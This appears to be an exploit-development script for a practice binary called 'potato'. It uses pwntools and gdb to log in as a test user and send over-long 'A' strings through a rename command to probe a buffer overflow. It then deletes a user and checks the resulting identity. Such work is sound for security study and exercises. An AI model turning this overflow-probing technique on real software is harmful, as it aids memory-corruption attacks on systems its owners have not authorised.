#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")
# context.binary = elf
# context.arch = 'i386'
# context.bits = 32
# context.endian = 'little'
# context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break userlist.c:88
break func.c:216
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

p.sendline(b"changename")
payload = b"\x41"*53
p.sendline(payload)

p.sendline(b"changename")
payload = b"\x41"*52
p.sendline(payload)

p.sendline(b"changename")
payload = b"peter"
p.sendline(payload)

p.sendline(b"delete")
p.sendline(b"2")

p.sendline(b"whoami")

p.interactive()